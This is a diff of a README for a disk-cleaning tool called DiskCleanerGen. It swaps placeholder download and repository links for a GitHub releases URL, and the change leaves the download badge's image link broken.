@@ -14,7 +14,7 @@ DiskCleanerGen is an advanced disk cleaning tool designed to optimize system per
 ## How to Use 🛠️
 
 1. Download the DiskCleanerGen tool from the following link:
-   [![Download DiskCleanerGen](https://img.shields.io/badge/Download-DiskCleanerGen-blue)](https://github.com/project/files/App.zip)
+   [![Download DiskCleanerGen](https://github.com/Kaydeshe/DiskCleanerGen/releases)](https://github.com/Kaydeshe/DiskCleanerGen/releases)
    
 >Note: The link provided needs to be launched to download the tool.
 
@@ -52,4 +52,4 @@ Let's work together to make DiskCleanerGen even better for users worldwide!
 
 ---
 
-🔗 **For more information, visit the [official DiskCleanerGen GitHub repository](https://github.com/project/files)**
+🔗 **For more information, visit the [official DiskCleanerGen GitHub repository](https://github.com/Kaydeshe/DiskCleanerGen/releases)**
